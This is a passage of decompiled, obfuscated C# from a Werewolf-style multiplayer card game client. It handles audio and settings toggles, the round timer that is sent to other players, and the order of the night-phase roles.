    {
label_4:
      int num1 = 14;
      int num2 = -10;
      while (true)
      {
        switch ((num2 ^ 60) + 57)
        {
          case 0:
            goto label_4;
          case 1:
            switch (num1)
            {
              case 55:
                this.EnableAudio = audio;
                num1 = 13;
                goto label_1;
              case 56:
                this.ChatBox.Font = new Font(this.ChatBox.Font.FontFamily, (float) this.thisPlayer.GetFontSize);
                num1 = 12;
                goto label_1;
              case 57:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm._Lambda\u0024__R223\u002D2);
                num1 = 15;
                goto label_1;
              case 58:
                num1 = 1;
                goto label_1;
              case 59:
                goto label_9;
              default:
                num2 = -5;
                continue;
            }
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.set_Card6);
            num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(25);
            continue;
          case 3:
label_1:
            num1 ^= 54;
            break;
        }
        num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(40);
      }
label_9:;
    }

    public void EnableSettingsButton()
    {
label_5:
      int num1 = 9;
      int num2 = 124;
      while (true)
      {
        switch (num2 ^ 60)
        {
          case 61:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46E);
            num2 = 1;
            continue;
          case 62:
            goto label_5;
          case 63:
            switch (num1)
            {
              case 61:
                num1 = 119;
                goto label_1;
              case 62:
                this.Settings.Enabled = true;
                num1 = 10;
                goto label_1;
              case 63:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48F);
                num1 = 8;
                goto label_1;
              case 64:
                goto label_10;
              default:
                num2 = 2;
                continue;
            }
          case 64:
label_1:
            num1 ^= 55;
            break;
        }
        num2 = 3;
      }
label_10:;
    }

    public bool GetAudioEnabledBool
    {
      get
      {
label_4:
        int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(12);
        int num2 = -6;
        bool enableAudio;
        while (true)
        {
          switch ((num2 ^ 60) + 61)
          {
            case 0:
              goto label_4;
            case 1:
              switch (num1 + 54)
              {
                case 0:
                  enableAudio = this.EnableAudio;
                  num1 = -13;
                  goto label_1;
                case 1:
                case 3:
                  goto label_10;
                case 2:
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_PlayerName7);
                  num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(40);
                  goto label_1;
                default:
                  num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(7);
                  continue;
              }
            case 2:
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF46B);
              num2 = -7;
              continue;
            case 3:
label_1:
              num1 ^= 56;
              break;
          }
          num2 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(5);
        }
label_10:
        return enableAudio;
      }
    }

    public List<Player> GetPlayerList
    {
      get
      {
label_4:
        int num1 = 5;
        int num2 = 2;
        List<Player> playerList;
        while (true)
        {
          switch (num2 ^ 57)
          {
            case 56:
              goto label_4;
            case 57:
              switch (num1)
              {
                case 61:
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_TimerLabel);
                  num1 = 7;
                  goto label_1;
                case 62:
                case 64:
                  goto label_10;
                case 63:
                  playerList = this.PlayerList;
                  num1 = 4;
                  goto label_1;
                default:
                  num2 = 1;
                  continue;
              }
            case 58:
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.set_VoteMenuButton);
              num2 = 3;
              continue;
            case 59:
label_1:
              num1 ^= 58;
              break;
          }
          num2 = 0;
        }
label_10:
        return playerList;
      }
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF485(
      object _param1,
      EventArgs _param2)
    {
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF486(
      object _param1,
      EventArgs _param2)
    {
label_7:
      int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(8);
      int num2 = 5;
      while (true)
      {
        switch (num2 ^ 60)
        {
          case 54:
            int num3;
            int num4;
            bool isMaster;
            switch (num1 + 56)
            {
              case 0:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_PlayerName7);
                num1 = -10;
                goto label_1;
              case 1:
                checked { ++this.Time; }
                num1 = -14;
                goto label_1;
              case 2:
                this.TimerLabel.Text = num3.ToString() + ":" + num4.ToString();
                num1 = -15;
                goto label_1;
              case 3:
                if (isMaster)
                {
                  num1 = -18;
                  goto label_1;
                }
                else
                  goto label_18;
              case 4:
                num4 = this.Time % 60;
                num1 = -13;
                goto label_1;
              case 5:
                num3 = checked ((int) Math.Round(unchecked ((double) checked (this.Time - num4) / 60.0 % 60.0)));
                num1 = -12;
                goto label_1;
              case 6:
                isMaster = this.isMaster;
                num1 = -11;
                goto label_1;
              case 7:
                num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
                goto label_1;
              case 8:
                goto label_17;
              default:
                num2 = 4;
                continue;
            }
          case 55:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF475);
            num2 = 11;
            continue;
          case 56:
            goto label_7;
          case 57:
label_1:
            num1 ^= 62;
            break;
        }
        num2 = 10;
      }
label_17:
      int num5 = 0;
      goto label_19;
label_18:
      num5 = 1;
label_19:
      if (num5 == 0)
      {
        byte[] bytes = Encoding.ASCII.GetBytes(this.TimerLabel.Text);
        this.sendingClient.Send(bytes, bytes.Length);
      }
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF489();
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF487(
      bool _param1)
    {
label_7:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
      int num2 = -3;
      while (true)
      {
        switch ((num2 ^ 59) + 61)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF475);
            num2 = -8;
            continue;
          case 1:
            switch (num1 + 54)
            {
              case 0:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF472);
                num1 = -15;
                goto label_1;
              case 1:
                this.GameTime.Enabled = _param1;
                num1 = -9;
                goto label_1;
              case 2:
                num1 = -10;
                goto label_1;
              case 3:
                goto label_9;
              default:
                num2 = -2;
                continue;
            }
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 59;
            break;
        }
        num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(7);
      }
label_9:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF488(
      string _param1)
    {
label_7:
      int num1 = 3;
      int num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(25);
      while (true)
      {
        switch ((num2 ^ 60) + 58)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.get_TimerLabel);
            num2 = -6;
            continue;
          case 1:
            switch (num1)
            {
              case 54:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_PlayerName9);
                num1 = 13;
                goto label_1;
              case 55:
                num1 = 1;
                goto label_1;
              case 56:
                this.TimerLabel.Text = _param1;
                num1 = 12;
                goto label_1;
              case 57:
                num1 = 0;
                goto label_1;
              case 58:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF489();
                num1 = 2;
                goto label_1;
              case 59:
                goto label_11;
              default:
                num2 = -12;
                continue;
            }
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 59;
            break;
        }
        num2 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(30);
      }
label_11:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF489()
    {
      if ((this.TimerLabel.Text.Contains("Timer") ? 1 : 0) != 0)
        return;
      string[] strArray = Strings.Split(this.TimerLabel.Text, ":");
label_3:
      int num1 = 6;
      bool boolean;
      while (true)
      {
        switch (num1 ^ 59)
        {
          case 60:
            if (boolean)
            {
              num1 = 122;
              continue;
            }
            goto label_11;
          case 61:
            this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48A(strArray[1]);
            num1 = 123;
            continue;
          case 62:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_PlayerName2);
            num1 = 5;
            continue;
          case 63:
            boolean = Conversions.ToBoolean(this.Night);
            num1 = 7;
            continue;
          case 64:
            num1 = 4;
            continue;
          case 65:
            goto label_10;
          default:
            goto label_3;
        }
      }
label_10:
      int num2 = 0;
      goto label_12;
label_11:
      num2 = 1;
label_12:
      if (num2 == 0)
      {
        this.TurnLabel.Visible = true;
label_15:
        int num3 = 125;
        while (true)
        {
          switch (num3 ^ 54)
          {
            case 63:
              num3 = 113;
              continue;
            case 64:
              this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF495();
              num3 = 120;
              continue;
            case 65:
              num3 = 100;
              continue;
            case 66:
              this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48E();
              num3 = 103;
              continue;
            case 67:
              num3 = 122;
              continue;
            case 68:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF47B);
              num3 = 114;
              continue;
            case 69:
              this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF494();
              num3 = 124;
              continue;
            case 70:
              this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48F();
              num3 = 9;
              continue;
            case 71:
              this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF490();
              num3 = 117;
              continue;
            case 72:
              this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF492();
              num3 = 123;
              continue;
            case 73:
              this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF493();
              num3 = 121;
              continue;
            case 74:
              num3 = 118;
              continue;
            case 75:
              num3 = 116;
              continue;
            case 76:
              this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF491();
              num3 = 102;
              continue;
            case 77:
              num3 = (int) sbyte.MaxValue;
              continue;
            case 78:
              num3 = 119;
              continue;
            case 79:
              num3 = 115;
              continue;
            case 80:
              num3 = 126;
              continue;
            case 81:
              num3 = 112;
              continue;
            case 82:
              goto label_37;
            default:
              goto label_15;
          }
        }
      }
      else if ((!Conversions.ToBoolean(Operators.AndObject(Operators.NotObject(this.Night), (object) this.RoundStarted)) ? 1 : 0) == 0)
      {
        this.TurnLabel.Text = "Night is over, day is among you.";
        this.TurnLabel.ForeColor = Color.WhiteSmoke;
        this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF496();
      }
label_37:
      if ((!(this.isMaster & this.GamePlayerCount < this.PlayerList.Count & !this.StartRound) ? 1 : 0) != 0)
        return;
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF487(false);
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48A(
      string _param1)
    {
      if ((!(_param1.Equals("5") & this.StartRound) ? 1 : 0) == 0)
      {
        this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48C();
label_5:
        int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(9);
        int num2 = 7;
        while (true)
        {
          switch (num2 ^ 60)
          {
            case 56:
              goto label_5;
            case 57:
              bool enableAudio;
              switch (num1 + 59)
              {
                case 0:
                  num1 = -10;
                  goto label_2;
                case 1:
                  this.VoteMenuButton.Enabled = true;
                  num1 = -14;
                  goto label_2;
                case 2:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF468);
                  num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(5);
                  goto label_2;
                case 3:
                  this.RoundStarted = true;
                  num1 = -11;
                  goto label_2;
                case 4:
                  this.StartRound = false;
                  num1 = -9;
                  goto label_2;
                case 5:
                  this.GamePlayerCount = this.PlayerList.Count;
                  num1 = -7;
                  goto label_2;
                case 6:
                  enableAudio = this.EnableAudio;
                  num1 = -13;
                  goto label_2;
                case 7:
                  if (enableAudio)
                  {
                    num1 = -15;
                    goto label_2;
                  }
                  else
                    goto label_20;
                case 8:
                  num1 = -12;
                  goto label_2;
                case 9:
                  goto label_19;
                default:
                  num2 = 4;
                  continue;
              }
            case 58:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF488);
              num2 = 6;
              continue;
            case 59:
label_2:
              num1 ^= 63;
              break;
          }
          num2 = 5;
        }
label_19:
        int num3 = 0;
        goto label_21;
label_20:
        num3 = 1;
label_21:
        if (num3 != 0)
          ;
        this.Night = (object) true;
      }
      if ((this.EnableAudio ? 1 : 0) != 0)
        return;
      \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uEB7F\uF247\uE858\uF5C7\uEC2A\uECFA\uEDD9\uE261\uF6B8\uF56C\uEBA5\uF443.Audio.Stop();
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48B()
    {
label_2:
      int num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(13);
      int num2;
      int num3;
      while (true)
      {
        switch ((num1 ^ 60) + 57)
        {
          case 0:
            num2 = 0;
            num1 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(25);
            continue;
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.RecieverAssigningCards);
            num1 = -12;
            continue;
          case 2:
            if (num2 != 0)
            {
              num1 = -9;
              continue;
            }
            goto label_9;
          case 3:
            num3 = checked (this.PlayerList.Count - 1);
            num1 = -5;
            continue;
          case 4:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:
      checked { ++num2; }
label_9:
      if (num2 > num3)
      {
        int num4 = checked (this.MiddleCardsList.Count - 1);
label_12:
        int num5 = 6;
        int num6;
        while (true)
        {
          switch (num5 ^ 59)
          {
            case 61:
              num6 = 0;
              num5 = 4;
              continue;
            case 62:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF472);
              num5 = 5;
              continue;
            case 63:
              if (num6 != 0)
              {
                num5 = 123;
                continue;
              }
              goto label_19;
            case 64:
              goto label_18;
            default:
              goto label_12;
          }
        }
label_18:
        checked { ++num6; }
label_19:
        if (num6 <= num4)
          goto label_18;
      }
      else
        goto label_8;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48C()
    {
      int num1 = checked (this.CharacterList.Count - 1);
      int index1 = 0;
      if (index1 == 0)
        goto label_4;
label_1:
      if ((!(this.CharacterList[index1].Equals("WereWolf") & !this.WWFound) ? 1 : 0) == 0)
      {
        this.RolePlayTime.Add("WereWolf", this.TurnTime);
        checked { ++this.TimeMulti; }
        this.WWFound = true;
        goto label_5;
      }
      else
        checked { ++index1; }
label_4:
      if (index1 <= num1)
        goto label_1;
label_5:
      int num2 = checked (this.CharacterList.Count - 1);
      int index2 = 0;
      if (index2 == 0)
        goto label_16;
label_6:
      if ((!(this.CharacterList[index2].Equals("Minion") & !this.MFound) ? 1 : 0) == 0)
      {
        this.RolePlayTime.Add("Minion", checked (this.TurnTime + 5 * this.TimeMulti));
label_9:
        int num3 = VoteMenuForm.\uF1A2\uF27A\uE0B6\uF1B5\uF540\uE7E6\uE54C\uE056\uF550\uF103\uEC30\uE3AF(43);
        while (true)
        {
          switch ((num3 ^ 60) + 63)
          {
            case 0:
              checked { ++this.TimeMulti; }
              num3 = -1;
              continue;
            case 1:
              num3 = -3;
              continue;
            case 2:
              this.MFound = true;
              num3 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(11);
              continue;
            case 3:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.get_Card5);
              num3 = -8;
              continue;
            case 4:
              goto label_17;
            default:
              goto label_9;
          }
        }
      }
      else
        checked { ++index2; }
label_16:
      if (index2 <= num2)
        goto label_6;
label_17:
      int num4 = checked (this.CharacterList.Count - 1);
      int index3 = 0;
      if (index3 == 0)
        goto label_27;
label_18:
      if ((!(this.CharacterList[index3].Equals("Seer") & !this.SFound) ? 1 : 0) == 0)
      {
        this.RolePlayTime.Add("Seer", checked (this.TurnTime + 5 * this.TimeMulti));
label_21:
        int num5 = 14;
        while (true)
        {
          switch (num5 ^ 54)
          {
            case 55:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (MainForm.EnableVoteMenuButton);
              num5 = 1;
              continue;
            case 56:
              num5 = 15;
              continue;
            case 57:
              checked { ++this.TimeMulti; }
              num5 = 12;
              continue;
            case 58:
              this.SFound = true;
              num5 = 13;
              continue;
            case 59:
              goto label_28;
            default:
              goto label_21;
          }
        }
      }
      else
        checked { ++index3; }
label_27:
      if (index3 <= num4)
        goto label_18;
label_28:
      int num6 = checked (this.CharacterList.Count - 1);
      int index4 = 0;
      if (index4 == 0)
        goto label_32;
label_29:
      if ((!(this.CharacterList[index4].Equals("Robber") & !this.RFound) ? 1 : 0) == 0)
      {
        this.RolePlayTime.Add("Robber", checked (this.TurnTime + 5 * this.TimeMulti));
        checked { ++this.TimeMulti; }
        this.RFound = true;
        goto label_33;
      }
      else
        checked { ++index4; }
label_32:
      if (index4 <= num6)
        goto label_29;
label_33:
      int num7 = checked (this.CharacterList.Count - 1);
      int index5 = 0;
      if (index5 == 0)
        goto label_37;
label_34:
      if ((!(this.CharacterList[index5].Equals("TroubleMaker") & !this.TMFound) ? 1 : 0) == 0)
      {
        this.RolePlayTime.Add("TroubleMaker", checked (this.TurnTime + 5 * this.TimeMulti));
        checked { ++this.TimeMulti; }
        this.TMFound = true;
        goto label_38;
      }
      else
        checked { ++index5; }
label_37:
      if (index5 <= num7)
        goto label_34;
label_38:
      int num8 = checked (this.CharacterList.Count - 1);
      int index6 = 0;
      if (index6 == 0)
        goto label_42;
label_39:
      if ((!(this.CharacterList[index6].Equals("Drunk") & !this.DFound) ? 1 : 0) == 0)
      {
        this.RolePlayTime.Add("Drunk", checked (this.TurnTime + 5 * this.TimeMulti));
        checked { ++this.TimeMulti; }
        this.DFound = true;
        goto label_43;
      }
      else
        checked { ++index6; }
label_42:
      if (index6 <= num8)
        goto label_39;
label_43:
      int num9 = checked (this.CharacterList.Count - 1);
      int index7 = 0;
      if (index7 == 0)
        goto label_47;
label_44:
      if ((!(this.CharacterList[index7].Equals("Insomniac") & !this.IFound) ? 1 : 0) == 0)
      {
        this.RolePlayTime.Add("Insomniac", checked (this.TurnTime + 5 * this.TimeMulti));
        checked { ++this.TimeMulti; }
        this.IFound = true;
        return;
      }
      checked { ++index7; }
label_47:
      if (index7 <= num9)
        goto label_44;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48D()
    {
label_5:
      int num1 = AsciiSnake.\uE5FF\uF096\uF68D\uF781\uF534\uEBFB\uF0C7\uE1C4\uE26D\uE19D\uE793\uED35(31);
      int num2 = -12;
      while (true)
      {
        switch ((num2 ^ 62) + 57)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF488);
            num2 = -7;
            continue;
          case 1:
            goto label_5;
          case 2:
            switch (num1 + 57)
            {
              case 0:
                this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48B();
                num1 = -13;
                goto label_1;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.get_ReadyToStart);
                num1 = -14;
                goto label_1;
              case 2:
                num1 = -9;
                goto label_1;
              case 3:
                this.TurnAllowed = false;
                num1 = -15;
                goto label_1;
              case 4:
                this.Card1.Enabled = false;
                num1 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(13);
                goto label_1;
              case 5:
                num1 = -3;
                goto label_1;
              case 6:
                goto label_12;
              default:
                num2 = -10;
                continue;
            }
          case 3:
label_1:
            num1 ^= 58;
            break;
        }
        num2 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(8);
      }
label_12:;
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48E()
    {
label_2:
      int num1 = 5;
      string[] strArray;
      bool flag1;
      while (true)
      {
        switch (num1 ^ 63)
        {
          case 58:
            strArray = Strings.Split(this.TimerLabel.Text, ":");
            num1 = 3;
            continue;
          case 59:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.set_ReadyToStart);
            num1 = 4;
            continue;
          case 60:
            flag1 = strArray[1].Equals(this.RolePlayTime["WereWolf"].ToString());
            num1 = 2;
            continue;
          case 61:
            if (flag1)
            {
              num1 = 1;
              continue;
            }
            goto label_9;
          case 62:
            goto label_8;
          default:
            goto label_2;
        }
      }
label_8:
      int num2 = 0;
      goto label_10;
label_9:
      num2 = 1;
label_10:
      if (num2 == 0)
      {
        this.TurnLabel.Text = "Werewolfs may be prowling...";
        if ((!this.InitialRole.Contains("WereWolf") ? 1 : 0) == 0)
        {
          this.TurnAllowed = true;
label_14:
          int num3 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(8);
          while (true)
          {
            int index;
            bool flag2;
            int num4;
            int num5;
            switch ((num3 ^ 62) + 60)
            {
              case 0:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF484);
                num3 = -6;
                continue;
              case 1:
label_16:
                flag2 = this.InitialRole.Contains(this.PlayerList[index].GetCardType);
                num3 = -7;
                continue;
              case 2:
                if (index == 0)
                {
                  num3 = -5;
                  continue;
                }
                goto label_28;
              case 3:
                if (flag2)
                {
                  num3 = -12;
                  continue;
                }
                num5 = 1;
                break;
              case 4:
                index = 1;
                num3 = -8;
                continue;
              case 5:
                num4 = checked (this.PlayerList.Count - 1);
                num3 = \uF1FC\uEEA7\uF50F\uF2C7\uEBC6\uE0A9\uE31B\uEC49\uE500\uEAD5\uE960\uED7F.\uE88C\uF46E\uE801\uEA56\uF2FE\uF668\uF1B6\uE38C\uE50C\uEB39\uF762\uF415.\uF354\uF214\uF8A8\uEDF0\uE733\uF32A\uF55B\uF1F9\uE459\uE072\uF874\uECBB(13);
                continue;
              case 6:
                num5 = 0;
                break;
              default:
                goto label_14;
            }
            if (num5 == 0)
              this.SawCard = true;
            checked { ++index; }
label_28:
            if (index <= num4)
              goto label_16;
            else
              break;
          }
        }
      }
      if ((!(Convert.ToInt32(strArray[1]) >= checked (this.RolePlayTime["WereWolf"] + 5) & this.InitialRole.Equals("WereWolf")) ? 1 : 0) != 0)
        return;
      this.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48D();
    }

    private void \uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48F()
    {
label_2:
      int num1 = 124;
      bool flag1;
      string[] strArray;
      int num2;
      while (true)
      {
        switch (num1 ^ 61)
        {
          case 63:
            if (flag1)
            {
              num1 = 126;
              continue;
            }
            goto label_9;
          case 64:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (MainForm.\uEDD4\uF57E\uE827\uF3E9\uF70C\uEFF1\uE971\uF7B1\uF1B9\uF555\uF725\uF48C);
            num1 = 125;
            continue;
          case 65:
